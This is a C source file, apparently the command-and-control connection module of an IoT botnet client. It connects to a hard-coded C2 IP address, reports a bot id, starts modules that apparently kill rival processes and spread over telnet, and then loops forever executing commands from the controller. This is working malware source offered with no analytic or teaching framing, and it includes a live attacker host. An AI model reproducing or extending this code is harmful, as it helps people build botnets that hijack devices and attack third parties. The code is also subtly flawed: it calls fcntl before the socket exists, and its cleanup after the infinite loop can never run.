#define _GNU_SOURCE
#include <stdlib.h>
#include <stdarg.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <fcntl.h>
#include <wait.h>
#include <sys/ioctl.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/wait.h>
#include "headers/connection.h"
#include "headers/commands.h"
#include "headers/killer.h"
#include "headers/telnet.h"
#include "headers/exploit.h"
#include "headers/util.h"
#include "headers/encryption.h"
int bot_port = 697;

int cncsocket = -1;

int killer_pid = 0;
int telnet_pid = 0;
int exploit_pid = 0;

struct sockaddr_in cncsock;

void connection_establish()
{
	fcntl(cncsocket, F_SETFL, O_NONBLOCK | fcntl(cncsocket, F_GETFL, 0));
    if((cncsocket = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
		close(cncsocket);
		close(0);
    }
    char bot_host[] = {"107.172.86.105"}; //ip here
    cncsock.sin_family = AF_INET;
    cncsock.sin_addr.s_addr = inet_addr(bot_host);
    cncsock.sin_port = htons(bot_port);
    if(connect(cncsocket, (struct sockaddr *)&cncsock, sizeof(cncsock)) == -1)
    {
	    close(cncsocket);
	    close(0);
    }
    else
    {
        util_sockprint(cncsocket, "id:%s", bot.id);
        killer_init();
        telnet_init();
        //exploit_init();
	  	while(1)
	  	{
	  		commands_parse();
	  	}
	  	killer_kill();
	  	telnet_kill();
	  	//exploit_kill();
	  	close(cncsocket);
	  	exit(0);
  	}
}
